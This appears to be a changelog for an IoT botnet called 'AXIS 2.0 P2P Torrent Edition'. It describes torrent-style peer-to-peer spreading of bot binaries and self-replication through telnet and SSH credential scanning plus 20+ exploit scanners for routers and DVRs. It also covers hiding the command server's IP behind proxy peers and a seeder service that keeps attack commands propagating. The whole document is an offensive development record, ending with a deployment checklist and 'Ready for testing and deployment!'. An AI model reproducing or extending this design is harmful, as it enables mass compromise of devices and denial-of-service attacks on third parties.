# BUG FIXES & CHANGELOG - AXIS 2.0 P2P Torrent Edition

## Latest Changes (Torrent Edition Refactor)

### 1. ✅ Torrent-Style P2P Binary Distribution
**Date:** April 2026
**Files:** `bot/p2pfile.c`, `bot/p2pfile.h`, `bot/p2p.c`, `loader/binary.c`
**Change:** Replaced HTTP-based binary distribution with torrent-style P2P seeding.
- Every bot downloads ALL 13 `axis.*` binaries from peers via UDP 49153
- Every bot becomes a seeder after download
- 4KB chunk-based transfers, max 256 chunks per binary
- Auto-redownload missing binaries every 5 minutes
- Loader sends P2P torrent download payload instead of HTTP URLs

### 2. ✅ Integrated Self-Replication into Bot Binary
**Date:** April 2026
**Files:** `bot/selfrep.c`, `bot/selfrep.h`
**Change:** Moved all `scanners-exploits/` functionality into the bot binary.
- Telnet scanner (90+ credentials)
- SSH scanner (16+ credentials)
- 20+ exploit scanners (Huawei, Zyxel, D-Link, Linksys, GPON, DVR, ADB, etc.)
- Every bot scans for new devices immediately after infection
- Scanner rotation: 60-second cycles between telnet, SSH, and exploit modes

### 3. ✅ CNC Proxy-Based Command Injection
**Date:** April 2026
**Files:** `cnc/p2p.go`, `cnc/admin.go`
**Change:** CNC now joins P2P network through proxy peers to shield its real IP.
```go
proxies := []string{
    // "proxy1:49152", "proxy2:49152",
}
injector := NewP2PInjector(p2pSeeds, proxies)
```
- Commands propagate through P2P network via proxies
- CNC IP is hidden from the botnet
- Auto peer discovery via torrent-style DHT ping/pong

### 4. ✅ CNC Auto-Seeding Control
**Date:** April 2026
**Files:** `cnc/p2p.go`, `cnc/admin.go`
**Change:** CNC automatically manages binary seeding based on bot count.
```go
const SEED_THRESHOLD = 200  // Stop seeding when bots >= 200
const SEED_RESUME = 200     // Resume seeding when bots < 200
```
- When bot count >= 200: CNC stops seeding binaries (network is self-sustaining)
- When bot count < 200: CNC resumes seeding binaries (network needs support)
- Admin panel shows seeding status: "seeding binaries" or "no binary seeding"

### 5. ✅ Seeder Service Created
**Date:** April 2026
**Files:** `seeder/main.go`
**Change:** New standalone Go service for continuously seeding attack commands.
```bash
./seeder_server <method> <target> <duration>
```
- Re-seeds attack commands every 10 seconds
- Uses same P2P protocol as bots
- Ensures persistent attack propagation

### 6. ✅ Bot Updated to Act as Seeder + Attacker
**Date:** April 2026
**Files:** `bot/main.c`, `bot/p2p.c`, `bot/p2pfile.c`, `bot/selfrep.c`
**Change:** Every bot now simultaneously:
- Seeds ALL binaries to peers (torrent-style)
- Executes attack commands from P2P network
- Runs self-replication scanners
- Discovers and maintains peer connections
- Downloads missing binaries from peers

### 7. ✅ Loader Updated for P2P Torrent Payload
**Date:** April 2026
**Files:** `loader/binary.c`, `loader/binary.h`
**Change:** Loader now sends P2P torrent download payload to infected devices.
```c
char *binary_build_p2p_payload(const char *seed_ip);
```
- Payload tells device to download all binaries from P2P peers
- No HTTP server needed
- Device becomes seeder after download

### 8. ✅ ClientCount() Added to ClientList
**Date:** April 2026
**Files:** `cnc/clientList.go`
**Change:** Added `ClientCount()` method for auto-seed control.
```go
func (this *ClientList) ClientCount() int {
    return this.Count()
}
```

## Previous Fixes

### 9. ✅ CNC Bot Handshake Mismatch
**Files:** `cnc/main.go`
**Fix:** Removed hardcoded ACK for P2P bots, kept for TLS bots

### 10. ✅ Hardcoded P2P Seeds Made Configurable
**Files:** `cnc/admin.go`
**Fix:** Changed from `"1.2.3.4:49152"` to configurable variable

### 11. ✅ P2P Attack Packet Documentation
**Files:** `cnc/p2p.go`, `bot/p2p.c`
**Fix:** Added clear comments explaining packet format

### 12. ✅ Attack Packet Format Verified
**Files:** `cnc/attack.go`, `bot/attack.c`
**Fix:** Confirmed matching formats between CNC builder and bot parser

## Configuration Required Before Deployment

### 1. Update Seed Peers
- `bot/config.h` → `P2P_SEEDS`
- `cnc/admin.go` → `p2pSeeds`
- `relay/config.go` → `seedPeers`
- `p2p_ctrl.py` → `SEEDS`

### 2. Configure Proxy Peers (CNC IP Shielding)
- `cnc/admin.go` → `proxies` array
- Add actual proxy peer IPs that will forward CNC commands

### 3. Change Default Passwords
- `cnc/database.json` → admin password
- `relay/config.go` → `validUsers` map

### 4. Set C&C Address
- `bot/config.h` → `CNC_ADDR`

## Build Verification

```bash
./build.sh
# Should produce:
# bins/axis.* (13 archs, with -DSELFREP flag)
# cnc_server
# seeder_server
# loader
```

## Testing Checklist

- [ ] Update P2P seeds in all config files
- [ ] Configure proxy peers in admin.go
- [ ] Change default admin passwords
- [ ] Test torrent-style binary downloads (UDP 49153)
- [ ] Test self-replication scanners
- [ ] Test proxy-based command injection
- [ ] Test auto-seed control (200 bot threshold)
- [ ] Test seeder service
- [ ] Verify every bot acts as seeder + attacker
- [ ] Monitor P2P traffic for proper protocol

## Status

**TORRENT EDITION COMPLETE**

- ✅ Torrent-style P2P binary distribution
- ✅ Self-replication integrated into bot binary
- ✅ CNC proxy-based command injection
- ✅ CNC auto-seed control (200 bot threshold)
- ✅ Seeder service created
- ✅ Every bot = seeder + attacker
- ✅ Loader updated for P2P torrent payload
- ✅ All documentation updated

**Ready for testing and deployment!**

---

**Last Updated:** April 2026
**Version:** 2.0 P2P Torrent Edition
